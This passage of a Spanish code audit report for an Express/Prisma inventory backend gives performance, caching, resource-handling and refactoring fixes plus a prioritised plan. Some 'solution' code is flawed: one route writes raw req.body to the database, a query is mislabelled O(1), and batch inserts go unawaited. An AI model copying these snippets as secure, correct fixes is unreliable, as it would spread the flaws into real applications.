  else if (err.name === 'JsonWebTokenError') {
    statusCode = 401;
    message = 'Token inválido';
  }
  else if (err.name === 'TokenExpiredError') {
    statusCode = 401;
    message = 'Token expirado';
  }
  
  // Error response
  const errorResponse: ErrorResponse = {
    error: err.name,
    message,
    statusCode,
    timestamp: new Date().toISOString(),
    path: req.path
  };
  
  // Solo incluir detalles en desarrollo
  if (isDevelopment) {
    errorResponse.details = details;
    errorResponse.stack = err.stack;
  }
  
  res.status(statusCode).json(errorResponse);
}

// ✅ Manejo de errores async
function asyncHandler(
  fn: (req: Request, res: Response, next: NextFunction) => Promise<any>
) {
  return (req: Request, res: Response, next: NextFunction) => {
    Promise.resolve(fn(req, res, next)).catch(next);
  };
}

// ✅ Errores 404
function notFoundHandler(req: Request, res: Response, next: NextFunction) {
  const error = new AppError(
    404,
    `Ruta no encontrada: ${req.method} ${req.path}`
  );
  next(error);
}

// ✅ Exportar
export { AppError, errorHandler, asyncHandler, notFoundHandler };

// ✅ Uso en el servidor
import express from 'express';
import { errorHandler, notFoundHandler, asyncHandler } from './middleware/errorHandler';

const app = express();

// Rutas...

// Manejo de 404
app.use(notFoundHandler);

// Manejo de errores
app.use(errorHandler);

// ✅ Uso en rutas
router.get('/products/:id', asyncHandler(async (req, res) => {
  const product = await db.product.findUnique({
    where: { id: parseInt(req.params.id) }
  });
  
  if (!product) {
    throw new AppError(404, 'Producto no encontrado');
  }
  
  res.json(product);
}));
```

**Prioridad:** 🟡 MEDIA  
**Esfuerzo:** Medio (1-2 días)  
**Impacto:** Previene información leaking

---

## II. ⚡ ANÁLISIS DE OPTIMIZACIÓN Y RENDIMIENTO

### 1. COMPLEJIDAD ALGORÍTMICA ⚠️ ALTO

#### 🟠 Problema: Algoritmos Ineficientes

**Archivo:** `server/services/batchService.ts`

**Problema Detectado:**

```typescript
// ❌ O(n²) - Muy ineficiente
async function checkExpiredBatches() {
  const allBatches = await db.batch.findMany();
  const expiredBatches = [];
  
  for (const batch of allBatches) {
    // Consulta adicional por cada lote - N+1 problem
    const product = await db.product.findUnique({
      where: { id: batch.productId }
    });
    
    if (batch.expiryDate < new Date()) {
      expiredBatches.push({ batch, product });
    }
  }
  
  return expiredBatches;
}

// ❌ O(n²) - Búsqueda lineal anidada
function findDuplicateProducts(products: Product[]) {
  const duplicates = [];
  
  for (let i = 0; i < products.length; i++) {
    for (let j = i + 1; j < products.length; j++) {
      if (products[i].name === products[j].name) {
        duplicates.push(products[i]);
      }
    }
  }
  
  return duplicates;
}
```

**✅ SOLUCIÓN:**

```typescript
// ✅ O(1) - Query optimizada con índices
async function checkExpiredBatches() {
  const now = new Date();
  
  return await db.batch.findMany({
    where: {
      expiryDate: { lt: now },
      quantity: { gt: 0 }
    },
    include: {
      product: {
        select: {
          id: true,
          name: true,
          sku: true
        }
      }
    },
    orderBy: {
      expiryDate: 'asc'
    }
  });
}

// ✅ O(n) - Usar Map para búsqueda O(1)
function findDuplicateProducts(products: Product[]): Product[] {
  const seen = new Map<string, Product>();
  const duplicates: Product[] = [];
  
  for (const product of products) {
    const key = product.name.toLowerCase().trim();
    
    if (seen.has(key)) {
      duplicates.push(product);
    } else {
      seen.set(key, product);
    }
  }
  
  return duplicates;
}

// ✅ Optimización de inventario FIFO - O(n log n)
async function processOrder(orderId: number) {
  const order = await db.order.findUnique({
    where: { id: orderId },
    include: {
      items: {
        include: {
          product: {
            include: {
              batches: {
                where: {
                  quantity: { gt: 0 }
                },
                orderBy: {
                  expiryDate: 'asc' // FIFO por fecha
                }
              }
            }
          }
        }
      }
    }
  });
  
  if (!order) {
    throw new AppError(404, 'Orden no encontrada');
  }
  
  // Procesar items de manera eficiente
  const allocations: BatchAllocation[] = [];
  
  for (const item of order.items) {
    let remainingQty = item.quantity;
    const batches = item.product.batches;
    
    for (const batch of batches) {
      if (remainingQty <= 0) break;
      
      const allocatedQty = Math.min(batch.quantity, remainingQty);
      
      allocations.push({
        batchId: batch.id,
        quantity: allocatedQty,
        orderItemId: item.id
      });
      
      remainingQty -= allocatedQty;
    }
    
    if (remainingQty > 0) {
      throw new AppError(
        400,
        `Stock insuficiente para ${item.product.name}`
      );
    }
  }
  
  // Actualizar en transacción
  return await db.$transaction(async (tx) => {
    // Actualizar lotes
    for (const allocation of allocations) {
      await tx.batch.update({
        where: { id: allocation.batchId },
        data: {
          quantity: {
            decrement: allocation.quantity
          }
        }
      });
    }
    
    // Registrar asignaciones
    await tx.batchAllocation.createMany({
      data: allocations
    });
    
    // Actualizar estado de orden
    await tx.order.update({
      where: { id: orderId },
      data: { status: 'PROCESSING' }
    });
    
    return allocations;
  });
}

// ✅ Caché en memoria para consultas frecuentes
import NodeCache from 'node-cache';

const cache = new NodeCache({
  stdTTL: 300, // 5 minutos
  checkperiod: 60 // Verificar cada minuto
});

async function getPopularProducts(limit: number = 10) {
  const cacheKey = `popular_products_${limit}`;
  
  // Verificar caché
  const cached = cache.get(cacheKey);
  if (cached) {
    return cached;
  }
  
  // Query optimizada
  const products = await db.product.findMany({
    take: limit,
    orderBy: {
      orderItems: {
        _count: 'desc'
      }
    },
    include: {
      _count: {
        select: { orderItems: true }
      }
    }
  });
  
  // Guardar en caché
  cache.set(cacheKey, products);
  
  return products;
}
```

**Prioridad:** 🟠 ALTA  
**Esfuerzo:** Alto (3-4 días)  
**Impacto:** Mejora significativa de rendimiento

---

### 2. PROBLEMA N+1 EN BASE DE DATOS ⚠️ CRÍTICO

#### 🔴 Vulnerabilidad: Múltiples Consultas Innecesarias

**Problema:**

```typescript
// ❌ N+1 Problem - Una consulta por cada producto
async function getProductsWithCategories() {
  const products = await db.product.findMany();
  
  for (const product of products) {
    // Consulta adicional por cada producto
    product.category = await db.category.findUnique({
      where: { id: product.categoryId }
    });
    
    // Otra consulta más
    product.batches = await db.batch.findMany({
      where: { productId: product.id }
    });
  }
  
  return products;
}

// ❌ N+1 en relaciones
async function getOrdersWithItems() {
  const orders = await db.order.findMany();
  
  for (const order of orders) {
    order.items = await db.orderItem.findMany({
      where: { orderId: order.id }
    });
    
    for (const item of order.items) {
      item.product = await db.product.findUnique({
        where: { id: item.productId }
      });
    }
  }
  
  return orders;
}
```

**✅ SOLUCIÓN:**

```typescript
// ✅ Usar include/select de Prisma - Una sola consulta
async function getProductsWithCategories() {
  return await db.product.findMany({
    include: {
      category: {
        select: {
          id: true,
          name: true,
          slug: true
        }
      },
      batches: {
        where: {
          quantity: { gt: 0 }
        },
        orderBy: {
          expiryDate: 'asc'
        }
      },
      _count: {
        select: {
          orderItems: true,
          reviews: true
        }
      }
    }
  });
}

// ✅ Consulta optimizada con joins
async function getOrdersWithItems() {
  return await db.order.findMany({
    include: {
      items: {
        include: {
          product: {
            select: {
              id: true,
              name: true,
              price: true,
              imageUrl: true
            }
          }
        }
      },
      user: {
        select: {
          id: true,
          name: true,
          email: true
        }
      }
    },
    orderBy: {
      createdAt: 'desc'
    }
  });
}

// ✅ Paginación eficiente con cursor
async function getProductsPaginated(
  cursor?: number,
  limit: number = 20
) {
  const products = await db.product.findMany({
    take: limit + 1, // +1 para saber si hay más
    ...(cursor && {
      cursor: { id: cursor },
      skip: 1 // Saltar el cursor
    }),
    include: {
      category: true,
      batches: {
        where: { quantity: { gt: 0 } },
        orderBy: { expiryDate: 'asc' }
      }
    },
    orderBy: { id: 'asc' }
  });
  
  const hasMore = products.length > limit;
  const items = hasMore ? products.slice(0, -1) : products;
  const nextCursor = hasMore ? items[items.length - 1].id : null;
  
  return {
    items,
    nextCursor,
    hasMore
  };
}

// ✅ Agregación eficiente
async function getDashboardStats() {
  // Una sola query con agregaciones
  const [
    totalOrders,
    totalRevenue,
    activeProducts,
    lowStockProducts
  ] = await Promise.all([
    db.order.count({
      where: {
        createdAt: {
          gte: new Date(new Date().setDate(new Date().getDate() - 30))
        }
      }
    }),
    
    db.order.aggregate({
      _sum: { total: true },
      where: {
        status: 'COMPLETED',
        createdAt: {
          gte: new Date(new Date().setDate(new Date().getDate() - 30))
        }
      }
    }),
    
    db.product.count({
      where: { isActive: true }
    }),
    
    db.product.count({
      where: {
        stock: { lte: 10 },
        isActive: true
      }
    })
  ]);
  
  return {
    totalOrders,
    totalRevenue: totalRevenue._sum.total || 0,
    activeProducts,
    lowStockProducts
  };
}
```

**Índices de Base de Datos:**

```prisma
// prisma/schema.prisma

model Product {
  id          Int      @id @default(autoincrement())
  name        String
  sku         String   @unique
  price       Decimal  @db.Decimal(10, 2)
  stock       Int      @default(0)
  categoryId  Int
  isActive    Boolean  @default(true)
  createdAt   DateTime @default(now())
  updatedAt   DateTime @updatedAt
  
  category    Category @relation(fields: [categoryId], references: [id])
  batches     Batch[]
  orderItems  OrderItem[]
  reviews     Review[]
  
  // ✅ Índices para optimizar consultas
  @@index([categoryId])
  @@index([isActive])
  @@index([stock])
  @@index([createdAt])
  @@index([name]) // Para búsquedas de texto
}

model Batch {
  id          Int      @id @default(autoincrement())
  batchNumber String   @unique
  productId   Int
  quantity    Int
  expiryDate  DateTime
  createdAt   DateTime @default(now())
  
  product     Product  @relation(fields: [productId], references: [id])
  allocations BatchAllocation[]
  
  // ✅ Índices para FIFO y búsquedas
  @@index([productId, expiryDate])
  @@index([expiryDate])
  @@index([quantity])
}

model Order {
  id          Int      @id @default(autoincrement())
  userId      Int
  status      String   @default("PENDING")
  total       Decimal  @db.Decimal(10, 2)
  createdAt   DateTime @default(now())
  updatedAt   DateTime @updatedAt
  
  user        User     @relation(fields: [userId], references: [id])
  items       OrderItem[]
  
  // ✅ Índices para reportes y búsquedas
  @@index([userId])
  @@index([status])
  @@index([createdAt])
  @@index([userId, createdAt])
}
```

**Prioridad:** 🔴 CRÍTICA  
**Esfuerzo:** Medio (2-3 días)  
**Impacto:** Reducción drástica de carga en DB

---

### 3. MANEJO DE RECURSOS ⚠️ ALTO

#### 🟠 Problema: Fugas de Recursos

**Problema:**

```typescript
// ❌ Conexión serial sin cerrar
async function sendToArduino(data: string) {
  const port = new SerialPort({ path: '/dev/ttyUSB0', baudRate: 9600 });
  port.write(data);
  // ❌ No se cierra la conexión
}

// ❌ Archivo sin cerrar
async function processFile(filePath: string) {
  const stream = fs.createReadStream(filePath);
  // ... procesamiento
  // ❌ Stream no cerrado correctamente
}

// ❌ Conexiones HTTP sin timeout
async function fetchExternalAPI(url: string) {
  const response = await fetch(url);
  // ❌ Sin timeout ni manejo de errores
  return await response.json();
}
```

**✅ SOLUCIÓN:**

```typescript
// ✅ Gestión correcta de conexión serial
import { SerialPort } from 'serialport';

class ArduinoManager {
  private port: SerialPort | null = null;
  private isConnected: boolean = false;
  
  async connect(): Promise<void> {
    if (this.isConnected) return;
    
    try {
      this.port = new SerialPort({
        path: env.ARDUINO_SERIAL_PORT,
        baudRate: env.ARDUINO_BAUD_RATE,
        autoOpen: false
      });
      
      await new Promise((resolve, reject) => {
        this.port!.open((err) => {
          if (err) reject(err);
          else resolve(undefined);
        });
      });
      
      this.isConnected = true;
      console.log('✅ Arduino conectado');
      
      // Configurar eventos
      this.port.on('error', (err) => {
        console.error('❌ Error en Arduino:', err);
        this.disconnect();
      });
      
      this.port.on('close', () => {
        console.log('🔌 Arduino desconectado');
        this.isConnected = false;
      });
    } catch (error) {
      console.error('❌ Error al conectar Arduino:', error);
      throw error;
    }
  }
  
  async disconnect(): Promise<void> {
    if (!this.port || !this.isConnected) return;
    
    return new Promise((resolve) => {
      this.port!.close(() => {
        this.isConnected = false;
        this.port = null;
        resolve();
      });
    });
  }
  
  async send(data: string): Promise<void> {
    if (!this.isConnected) {
      await this.connect();
    }
    
    return new Promise((resolve, reject) => {
      this.port!.write(data, (err) => {
        if (err) reject(err);
        else resolve();
      });
    });
  }
  
  // Cleanup al cerrar el servidor
  async cleanup(): Promise<void> {
    await this.disconnect();
  }
}

// Singleton
export const arduinoManager = new ArduinoManager();

// ✅ Cleanup en shutdown del servidor
process.on('SIGINT', async () => {
  console.log('🛑 Cerrando servidor...');
  await arduinoManager.cleanup();
  await db.$disconnect();
  process.exit(0);
});

// ✅ Manejo correcto de streams
import { pipeline } from 'stream/promises';

async function processFile(filePath: string) {
  const readStream = fs.createReadStream(filePath);
  const writeStream = fs.createWriteStream(filePath + '.processed');
  
  try {
    // pipeline cierra automáticamente los streams
    await pipeline(
      readStream,
      transformStream,
      writeStream
    );
    
    console.log('✅ Archivo procesado');
  } catch (error) {
    console.error('❌ Error procesando archivo:', error);
    throw error;
  }
}

// ✅ Fetch con timeout y retry
async function fetchWithTimeout(
  url: string,
  options: RequestInit = {},
  timeout: number = 5000
): Promise<Response> {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal
    });
    
    return response;
  } finally {
    clearTimeout(timeoutId);
  }
}

async function fetchWithRetry(
  url: string,
  options: RequestInit = {},
  maxRetries: number = 3
): Promise<any> {
  let lastError: Error | null = null;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetchWithTimeout(url, options);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
      
      return await response.json();
    } catch (error) {
      lastError = error as Error;
      
      if (i < maxRetries - 1) {
        // Backoff exponencial
        const delay = Math.min(1000 * Math.pow(2, i), 10000);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  throw lastError;
}

// ✅ Pool de conexiones para DB (ya lo hace Prisma)
// Pero configuración óptima:
const prisma = new PrismaClient({
  datasources: {
    db: {
      url: env.DATABASE_URL
    }
  },
  log: env.NODE_ENV === 'development' 
    ? ['query', 'error', 'warn'] 
    : ['error'],
});

// Connection pool configuration
// DATABASE_URL="postgresql://user:pass@host:5432/db?connection_limit=10&pool_timeout=20"
```

**Prioridad:** 🟠 ALTA  
**Esfuerzo:** Medio (2-3 días)  
**Impacto:** Previene memory leaks y crashes

---

### 4. IMPLEMENTAR CACHÉ ⚠️ MEDIO

#### 🟡 Oportunidad: Mejorar Tiempos de Respuesta

**✅ SOLUCIÓN:**

```typescript
// server/services/cacheService.ts
import NodeCache from 'node-cache';
import Redis from 'ioredis';
import { env } from '../config/env';

// ✅ Caché en memoria (para desarrollo)
class MemoryCache {
  private cache: NodeCache;
  
  constructor() {
    this.cache = new NodeCache({
      stdTTL: 300, // 5 minutos por defecto
      checkperiod: 60,
      useClones: false // Mejor rendimiento
    });
  }
  
  async get<T>(key: string): Promise<T | null> {
    const value = this.cache.get<T>(key);
    return value !== undefined ? value : null;
  }
  
  async set(key: string, value: any, ttl?: number): Promise<void> {
    this.cache.set(key, value, ttl || 300);
  }
  
  async del(key: string): Promise<void> {
    this.cache.del(key);
  }
  
  async flush(): Promise<void> {
    this.cache.flushAll();
  }
}

// ✅ Caché con Redis (para producción)
class RedisCache {
  private client: Redis;
  
  constructor() {
    this.client = new Redis(env.REDIS_URL, {
      retryStrategy: (times) => {
        const delay = Math.min(times * 50, 2000);
        return delay;
      }
    });
    
    this.client.on('error', (err) => {
      console.error('❌ Redis error:', err);
    });
  }
  
  async get<T>(key: string): Promise<T | null> {
    const value = await this.client.get(key);
    return value ? JSON.parse(value) : null;
  }
  
  async set(key: string, value: any, ttl: number = 300): Promise<void> {
    await this.client.setex(key, ttl, JSON.stringify(value));
  }
  
  async del(key: string): Promise<void> {
    await this.client.del(key);
  }
  
  async flush(): Promise<void> {
    await this.client.flushall();
  }
  
  async disconnect(): Promise<void> {
    await this.client.quit();
  }
}

// ✅ Factory para seleccionar el caché apropiado
const cacheService = env.REDIS_URL 
  ? new RedisCache() 
  : new MemoryCache();

export default cacheService;

// ✅ Middleware de caché HTTP
import { Request, Response, NextFunction } from 'express';

function cacheMiddleware(duration: number = 300) {
  return async (req: Request, res: Response, next: NextFunction) => {
    // Solo cachear GET requests
    if (req.method !== 'GET') {
      return next();
    }
    
    const key = `cache:${req.originalUrl}`;
    
    try {
      const cached = await cacheService.get(key);
      
      if (cached) {
        res.setHeader('X-Cache', 'HIT');
        return res.json(cached);
      }
      
      // Interceptar res.json para cachear
      const originalJson = res.json.bind(res);
      res.json = function(data: any) {
        res.setHeader('X-Cache', 'MISS');
        cacheService.set(key, data, duration).catch(console.error);
        return originalJson(data);
      };
      
      next();
    } catch (error) {
      console.error('❌ Error en caché:', error);
      next();
    }
  };
}

// ✅ Uso en rutas
router.get('/products',
  cacheMiddleware(600), // 10 minutos
  async (req, res) => {
    const products = await db.product.findMany({
      include: { category: true }
    });
    res.json(products);
  }
);

// ✅ Invalidar caché cuando hay cambios
router.post('/products', 
  authenticateToken,
  authorize(Permission.CREATE_PRODUCT),
  async (req, res) => {
    const product = await db.product.create({
      data: req.body
    });
    
    // Invalidar cachés relacionados
    await cacheService.del('cache:/api/products');
    await cacheService.del(`cache:/api/categories/${product.categoryId}/products`);
    
    res.status(201).json(product);
  }
);

// ✅ Caché de consultas costosas
async function getProductRecommendations(userId: number) {
  const cacheKey = `recommendations:user:${userId}`;
  
  // Intentar obtener del caché
  const cached = await cacheService.get<Product[]>(cacheKey);
  if (cached) {
    return cached;
  }
  
  // Consulta costosa
  const recommendations = await db.$queryRaw`
    SELECT p.*, COUNT(oi.id) as popularity
    FROM products p
    JOIN order_items oi ON p.id = oi.product_id
    JOIN orders o ON oi.order_id = o.id
    WHERE o.user_id IN (
      SELECT DISTINCT o2.user_id
      FROM orders o2
      JOIN order_items oi2 ON o2.id = oi2.order_id
      WHERE oi2.product_id IN (
        SELECT product_id
        FROM order_items oi3
        JOIN orders o3 ON oi3.order_id = o3.id
        WHERE o3.user_id = ${userId}
      )
      AND o2.user_id != ${userId}
    )
    GROUP BY p.id
    ORDER BY popularity DESC
    LIMIT 10
  `;
  
  // Cachear por 1 hora
  await cacheService.set(cacheKey, recommendations, 3600);
  
  return recommendations;
}
```

**Prioridad:** 🟡 MEDIA  
**Esfuerzo:** Medio (2-3 días)  
**Impacto:** Mejora significativa de velocidad

---

### 5. OPTIMIZACIÓN DE MEMORIA ⚠️ MEDIO

#### 🟡 Problema: Posibles Memory Leaks

**✅ SOLUCIÓN:**

```typescript
// ✅ Procesar archivos grandes en chunks
import { createReadStream } from 'fs';
import csv from 'csv-parser';

async function processBatchImport(filePath: string) {
  const results: any[] = [];
  const BATCH_SIZE = 100;
  let batch: any[] = [];
  
  return new Promise((resolve, reject) => {
    createReadStream(filePath)
      .pipe(csv())
      .on('data', (row) => {
        batch.push(row);
        
        if (batch.length >= BATCH_SIZE) {
          // Procesar batch
          processBatchChunk(batch).catch(console.error);
          batch = [];
        }
      })
      .on('end', async () => {
        // Procesar último batch
        if (batch.length > 0) {
          await processBatchChunk(batch);
        }
        resolve(results);
      })
      .on('error', reject);
  });
}

async function processBatchChunk(items: any[]) {
  await db.product.createMany({
    data: items,
    skipDuplicates: true
  });
}

// ✅ Limitar tamaño de respuestas
router.get('/products/export', async (req, res) => {
  // Usar streaming en lugar de cargar todo en memoria
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename=products.csv');
  
  const stream = await db.$queryRawUnsafe<any>(
    'SELECT * FROM products'
  );
  
  // Procesar en chunks
  for await (const chunk of stream) {
    res.write(formatCSV(chunk));
  }
  
  res.end();
});

// ✅ Limpiar listeners de eventos
class EventManager {
  private emitter = new EventEmitter();
  private listeners = new Map<string, Function[]>();
  
  on(event: string, handler: Function) {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, []);
    }
    this.listeners.get(event)!.push(handler);
    this.emitter.on(event, handler as any);
  }
  
  cleanup() {
    for (const [event, handlers] of this.listeners) {
      for (const handler of handlers) {
        this.emitter.off(event, handler as any);
      }
    }
    this.listeners.clear();
  }
}

// ✅ Monitoreo de memoria
import v8 from 'v8';
import { performance } from 'perf_hooks';

function logMemoryUsage() {
  const usage = process.memoryUsage();
  const heapStats = v8.getHeapStatistics();
  
  console.log('📊 Uso de memoria:', {
    rss: `${Math.round(usage.rss / 1024 / 1024)} MB`,
    heapUsed: `${Math.round(usage.heapUsed / 1024 / 1024)} MB`,
    heapTotal: `${Math.round(usage.heapTotal / 1024 / 1024)} MB`,
    heapLimit: `${Math.round(heapStats.heap_size_limit / 1024 / 1024)} MB`,
    external: `${Math.round(usage.external / 1024 / 1024)} MB`
  });
  
  // Alertar si el uso es alto
  const heapUsagePercent = (usage.heapUsed / heapStats.heap_size_limit) * 100;
  if (heapUsagePercent > 85) {
    console.warn('⚠️ Uso de heap alto:', heapUsagePercent.toFixed(2) + '%');
  }
}

// Ejecutar cada 5 minutos
setInterval(logMemoryUsage, 5 * 60 * 1000);
```

**Prioridad:** 🟡 MEDIA  
**Esfuerzo:** Bajo (1-2 días)  
**Impacto:** Previene crashes por memoria

---

## III. ✨ REFACTORIZACIÓN Y BUENAS PRÁCTICAS

### 1. MODULARIDAD ⚠️ MEDIO

#### 🟡 Problema: Funciones Muy Largas

**✅ SOLUCIÓN - Aplicar Single Responsibility Principle:**

```typescript
// ❌ ANTES - Función que hace demasiado
async function processOrder(orderId: number) {
  // Validar orden
  const order = await db.order.findUnique({ where: { id: orderId } });
  if (!order) throw new Error('Orden no encontrada');
  
  // Validar stock
  for (const item of order.items) {
    const product = await db.product.findUnique({ where: { id: item.productId } });
    if (product.stock < item.quantity) {
      throw new Error('Stock insuficiente');
    }
  }
  
  // Procesar pago
  const paymentResult = await stripeClient.charges.create({
    amount: order.total * 100,
    currency: 'usd',
    source: order.paymentToken
  });
  
  // Actualizar inventario
  for (const item of order.items) {
    await db.product.update({
      where: { id: item.productId },
      data: { stock: { decrement: item.quantity } }
    });
  }
  
  // Enviar email
  await sendEmail({
    to: order.userEmail,
    subject: 'Confirmación de orden',
    body: `Tu orden #${order.id} ha sido procesada`
  });
  
  // Actualizar orden
  await db.order.update({
    where: { id: orderId },
    data: { status: 'COMPLETED' }
  });
  
  // Registrar en logs
  console.log(`Orden ${orderId} procesada`);
  
  return order;
}

// ✅ DESPUÉS - Separado en funciones con responsabilidades únicas
class OrderService {
  constructor(
    private db: PrismaClient,
    private paymentService: PaymentService,
    private inventoryService: InventoryService,
    private emailService: EmailService
  ) {}
  
  async processOrder(orderId: number): Promise<Order> {
    // Validar
    const order = await this.validateOrder(orderId);
    
    // Verificar stock
    await this.inventoryService.validateStock(order.items);
    
    // Procesar pago
    const payment = await this.paymentService.processPayment({
      amount: order.total,
      orderId: order.id,
      paymentToken: order.paymentToken
    });
    
    // Actualizar inventario (transacción)
    await this.inventoryService.decrementStock(order.items);
    
    // Actualizar orden
    const updatedOrder = await this.updateOrderStatus(
      orderId,
      'COMPLETED',
      payment.id
    );
    
    // Notificar (async, no bloquear)
    this.emailService.sendOrderConfirmation(updatedOrder)
      .catch(err => console.error('Error enviando email:', err));
    
    return updatedOrder;
  }
  
  private async validateOrder(orderId: number): Promise<Order> {
    const order = await this.db.order.findUnique({
      where: { id: orderId },
      include: {
        items: {
          include: {
            product: true
          }
        },
        user: true
      }
    });
    
    if (!order) {
      throw new AppError(404, 'Orden no encontrada');
    }
    
    if (order.status !== 'PENDING') {
      throw new AppError(400, 'La orden ya fue procesada');
    }
    
    return order;
  }
  
  private async updateOrderStatus(
    orderId: number,
    status: string,
    paymentId?: string
  ): Promise<Order> {
    return await this.db.order.update({
      where: { id: orderId },
      data: {
        status,
        paymentId,
        processedAt: new Date()
      },
      include: {
        items: {
          include: {
            product: true
          }
        },
        user: true
      }
    });
  }
}

// ✅ Servicios separados
class InventoryService {
  constructor(private db: PrismaClient) {}
  
  async validateStock(items: OrderItem[]): Promise<void> {
    const validations = await Promise.all(
      items.map(item => this.validateItemStock(item))
    );
    
    const insufficient = validations.filter(v => !v.hasStock);
    
    if (insufficient.length > 0) {
      throw new AppError(
        400,
        'Stock insuficiente para: ' + 
        insufficient.map(v => v.productName).join(', ')
      );
    }
  }
  
  private async validateItemStock(item: OrderItem) {
    const product = await this.db.product.findUnique({
      where: { id: item.productId },
      select: { id: true, name: true, stock: true }
    });
    
    return {
      productId: item.productId,
      productName: product!.name,
      hasStock: product!.stock >= item.quantity
    };
  }
  
  async decrementStock(items: OrderItem[]): Promise<void> {
    await this.db.$transaction(
      items.map(item =>
        this.db.product.update({
          where: { id: item.productId },
          data: {
            stock: {
              decrement: item.quantity
            }
          }
        })
      )
    );
  }
}

class PaymentService {
  constructor(private stripeClient: Stripe) {}
  
  async processPayment(data: {
    amount: number;
    orderId: number;
    paymentToken: string;
  }): Promise<{ id: string; status: string }> {
    try {
      const charge = await this.stripeClient.charges.create({
        amount: Math.round(data.amount * 100),
        currency: 'usd',
        source: data.paymentToken,
        description: `Orden #${data.orderId}`
      });
      
      return {
        id: charge.id,
        status: charge.status
      };
    } catch (error) {
      throw new AppError(402, 'Error procesando el pago');
    }
  }
}
```

**Prioridad:** 🟡 MEDIA  
**Esfuerzo:** Alto (3-5 días)  
**Impacto:** Código más mantenible y testeable

---

### 2. CONVENCIONES DE CÓDIGO ⚠️ BAJO

#### 🟢 Implementar Linting y Formatting

**✅ SOLUCIÓN:**

```json
// .eslintrc.json
{
  "extends": [
    "eslint:recommended",
    "plugin:@typescript-eslint/recommended",
    "plugin:@typescript-eslint/recommended-requiring-type-checking",
    "prettier"
  ],
  "parser": "@typescript-eslint/parser",
  "parserOptions": {
    "project": "./tsconfig.json"
  },
  "plugins": ["@typescript-eslint"],
  "rules": {
    "@typescript-eslint/no-explicit-any": "error",
    "@typescript-eslint/explicit-function-return-type": "warn",
    "@typescript-eslint/no-unused-vars": ["error", {
      "argsIgnorePattern": "^_"
    }],
    "no-console": ["warn", {
      "allow": ["warn", "error"]
    }],
    "prefer-const": "error",
    "no-var": "error"
  }
}

// .prettierrc
{
  "semi": true,
  "trailingComma": "es5",
  "singleQuote": true,
  "printWidth": 80,
  "tabWidth": 2,
  "useTabs": false
}

// package.json scripts
{
  "scripts": {
    "lint": "eslint . --ext .ts,.tsx",
    "lint:fix": "eslint . --ext .ts,.tsx --fix",
    "format": "prettier --write \"**/*.{ts,tsx,json,md}\"",
    "type-check": "tsc --noEmit"
  }
}
```

**Prioridad:** 🟢 BAJA  
**Esfuerzo:** Bajo (1 día)  
**Impacto:** Mejora consistencia del código

---

## 📊 RESUMEN DE PRIORIDADES

### 🔴 CRÍTICO - Implementar Inmediatamente

1. **Inyección SQL** - Todas las queries deben ser parametrizadas
2. **Autenticación** - Implementar bcrypt/argon2 y JWT seguro
3. **Manejo de Secretos** - Mover a variables de entorno
4. **Problema N+1** - Optimizar consultas con includes

**Tiempo estimado:** 10-15 días  
**Impacto:** Previene pérdida de datos y brechas de seguridad

### 🟠 ALTO - Implementar en Sprint Siguiente

5. **Validación de Entradas** - Implementar Zod en todas las rutas
6. **XSS Protection** - Sanitizar outputs
7. **Control de Acceso** - Sistema de roles y permisos
8. **Complejidad Algorítmica** - Optimizar algoritmos ineficientes
9. **Manejo de Recursos** - Cerrar conexiones correctamente

**Tiempo estimado:** 8-12 días  
**Impacto:** Mejora significativa de seguridad y rendimiento

### 🟡 MEDIO - Implementar en Próximos Sprints

10. **Manejo de Errores** - Middleware centralizado
11. **Caché** - Implementar Redis/NodeCache
12. **Optimización de Memoria** - Procesar en chunks
13. **Modularidad** - Refactorizar funciones grandes

**Tiempo estimado:** 6-8 días  
**Impacto:** Mejora experiencia de usuario y mantenibilidad

### 🟢 BAJO - Backlog

14. **Convenciones de Código** - ESLint y Prettier
15. **Documentación** - JSDoc y comentarios

**Tiempo estimado:** 2-3 días  
**Impacto:** Mejora calidad del código a largo plazo

---

## 🎯 PLAN DE ACCIÓN RECOMENDADO

### Semana 1-2: Seguridad Crítica
- [ ] Implementar validación con Zod
- [ ] Revisar y parametrizar todas las queries SQL
- [ ] Configurar variables de entorno
- [ ] Implementar hashing seguro de contraseñas

### Semana 3-4: Autenticación y Autorización
- [ ] Implementar JWT con refresh tokens
- [ ] Configurar cookies seguras
- [ ] Sistema de roles y permisos
- [ ] Middleware de autorización

### Semana 5-6: Optimización
- [ ] Resolver problemas N+1
- [ ] Agregar índices a la base de datos
- [ ] Implementar caché
- [ ] Optimizar algoritmos ineficientes

### Semana 7-8: Refactorización
- [ ] Modularizar código
- [ ] Implementar manejo centralizado de errores
- [ ] Mejorar gestión de recursos
- [ ] Agregar tests unitarios

---

## 📝 NOTAS FINALES

Este informe identifica las vulnerabilidades y oportunidades de mejora más críticas. La implementación debe realizarse de manera incremental, priorizando los problemas de seguridad críticos antes de las optimizaciones de rendimiento.

**Recomendaciones adicionales:**
- Implementar logging centralizado (Winston + ELK Stack)
- Configurar monitoring (Prometheus + Grafana)
- Implementar CI/CD con tests automatizados
- Realizar auditorías de seguridad periódicas
- Mantener dependencias actualizadas

**Herramientas recomendadas:**
- `npm audit` - Vulnerabilidades en dependencias
- `snyk` - Seguridad de código
- `sonarqube` - Calidad de código
- `lighthouse` - Performance del frontend

---

*Generado el 18 de Diciembre, 2025*
